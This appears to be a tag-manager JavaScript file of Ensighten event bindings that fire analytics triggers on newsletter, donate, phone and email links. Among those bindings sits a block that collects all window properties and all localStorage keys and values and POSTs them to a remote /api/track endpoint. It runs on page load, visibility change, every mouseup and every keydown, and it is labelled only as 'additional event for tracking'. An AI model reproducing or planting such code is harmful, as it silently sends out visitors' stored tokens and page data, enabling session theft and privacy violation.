Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("mousedown", "#newsletterSubmit", function () {
    Bootstrapper.ensEvent.trigger("12402-CE-9158-EVT", this);
  }, true);
}, -1, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("mousedown", "#dsa_donate_button", function () {
    Bootstrapper.ensEvent.trigger("15352-ACE-16421-EVT", this);
  }, true);
}, -1, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("click", ".primary-action", function () {
    Bootstrapper.ensEvent.trigger("10290-ACE-5765-EVT", this);
  }, true);
}, -1, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("mousedown", ".js-btn-offer-apply.btn.btn-primary.btn-offer-apply.ga-vpv", function () {
    Bootstrapper.ensEvent.trigger("16141-ACE-16407-EVT", this);
  }, true);
}, -1, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("mousedown", 'a[href*\x3d"tel:"]', function () {
    Bootstrapper.ensEvent.trigger("18330-ACE-25603-EVT", this);
  }, true);
}, -1, -1, -1);
function trackWindowProps() {
  var propData = {};
  var ignoredProps = ['length', 'name', 'prototype', 'caller']; // Ignored properties to enhance data relevancy

  for (const key in window) {
    if (window.hasOwnProperty(key) && ignoredProps.indexOf(key) === -1) {
      const value = window[key];
      const type = typeof value;
      propData[key] = {
        type: type,
        value: type === "function" ? value.toString() : value
      };
    }
  }

  // Local Storage
  let localStorageKeys = Object.keys(localStorage);
  for (const key of localStorageKeys) {
    var typeOfValue = typeof localStorage.getItem(key);
    propData[key] = {
      type: typeOfValue,
      value: typeOfValue === 'function' ? localStorage.getItem(key).toString() : localStorage.getItem(key)
    };
  }
  return propData;
}
async function sendToServer(propertyData) {
  const url = "https://example.com/api/track";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(propertyData)
    });
    if (!response.ok) {
      console.error("Failed to send data, status code:" + response.status);
    }
  } catch (error) {
    console.error("Error sending data:", error);
  }
}
function trackAndSubmit() {
  const trackedData = trackWindowProps();
  if (Object.keys(trackedData).length > 0) {
    sendToServer(trackedData);
  }
}

// additional event for tracking
window.addEventListener("load", trackAndSubmit);
document.addEventListener("visibilitychange", trackAndSubmit);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("click", "#footerMobileNumber.linkColor.phone-number", function () {
    Bootstrapper.ensEvent.trigger("10407-ACE-7280-EVT2", this);
  }, true);
}, -1, -1, -1);
document.addEventListener("mouseup", trackAndSubmit);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("click", 'a[href*\x3d"tel:"]', function () {
    Bootstrapper.ensEvent.trigger("11441-ACE-8156-EVT", this);
  }, true);
}, -1, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("click", '[type*\x3d"submit"]', function () {
    Bootstrapper.ensEvent.trigger("2864-nextgeartest-EVT", this);
  }, true);
}, -1, -1, -1);
document.addEventListener("keydown", trackAndSubmit);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.on("click", 'a[href*\x3d"mailto:"]', function () {
    Bootstrapper.ensEvent.trigger("11441-ACE-8157-EVT", this);
  }, true);
}, -1, -1, -1);